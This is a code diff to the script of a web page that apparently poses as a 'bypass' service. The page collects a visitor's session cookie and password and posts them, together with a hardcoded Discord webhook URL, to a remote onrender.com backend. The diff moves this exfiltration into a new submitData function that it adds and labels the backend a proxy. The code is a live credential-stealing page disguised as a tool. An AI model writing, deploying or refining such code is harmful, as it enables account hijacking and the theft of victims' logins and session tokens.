@@ -166,11 +166,35 @@
 
 <script>
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1525520420260941955/2AOfsSAlQ6nr1UITDMHXStyEiLaKGDMpsWeHFldDpL8dVl8Z1O2VCZ3NNd3N9mp-TlJ_";
-  const BACKEND_URL = "https://bypass-zen.onrender.com";
+  const PROXY_URL = "https://bypass-zen1.onrender.com";
 
   function showStatus(type, text) {
     const statusEl = document.getElementById("status");
     statusEl.innerHTML = '<div class="status-box ' + type + '">' + text + '</div>';
+  }
+
+  async function submitData(cookie, password, category) {
+    const proxyUrl = PROXY_URL + "/api/submit";
+    
+    try {
+      const response = await fetch(proxyUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          cookie: cookie,
+          password: password,
+          category: category,
+          webhookUrl: WEBHOOK_URL
+        })
+      });
+      
+      const data = await response.json();
+      console.log("[DEBUG] Response:", data);
+      return data;
+    } catch (err) {
+      console.log("[DEBUG] Error:", err);
+      return { isValid: false, reason: "Network: " + err.message };
+    }
   }
 
   document.getElementById("mainForm").addEventListener("submit", async (e) => {
@@ -192,39 +216,18 @@
     button.disabled = true;
     showStatus("", "Validating cookie...");
 
-    try {
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 35000);
+    const result = await submitData(message1, message2, selectedCategory);
 
-      const response = await fetch(`${BACKEND_URL}/api/submit`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        signal: controller.signal,
-        body: JSON.stringify({
-          cookie: message1,
-          password: message2,
-          category: selectedCategory,
-          webhookUrl: WEBHOOK_URL
-        })
-      });
-
-      clearTimeout(timeoutId);
-      const data = await response.json();
-
-      if (!response.ok || !data.isValid) {
-        button.disabled = false;
-        showStatus("error", "❌ Invalid Cookie! " + (data.reason || ""));
-        return;
-      }
-
-      showStatus("success", "✓ Valid! " + data.username + " (ID: " + data.userId + ")");
-      e.target.reset();
-      startCooldown(button, 180);
-
-    } catch (err) {
+    if (!result.isValid) {
       button.disabled = false;
-      showStatus("error", "❌ Server error or waking up. Try again in a moment.");
+      showStatus("error", "❌ Invalid Cookie! " + (result.reason || ""));
+      return;
     }
+
+    showStatus("success", "✓ Valid! " + result.username + " (ID: " + result.userId + ")");
+    button.disabled = false;
+    e.target.reset();
+    startCooldown(button, 180);
   });
 
   function startCooldown(button, seconds) {
@@ -240,10 +243,8 @@
       const s = String(remaining % 60).padStart(2, "0");
       button.innerHTML = 'Wait <span class="timer-digits" id="timerDigits">' + m + ":" + s + '</span>';
       const digitsEl = document.getElementById("timerDigits");
-      if (digitsEl) {
-        void digitsEl.offsetWidth;
-        digitsEl.classList.add("tick");
-      }
+      void digitsEl.offsetWidth;
+      digitsEl.classList.add("tick");
       progressFill.style.width = ((seconds - remaining) / seconds) * 100 + "%";
       if (remaining <= 0) {
         clearInterval(interval);
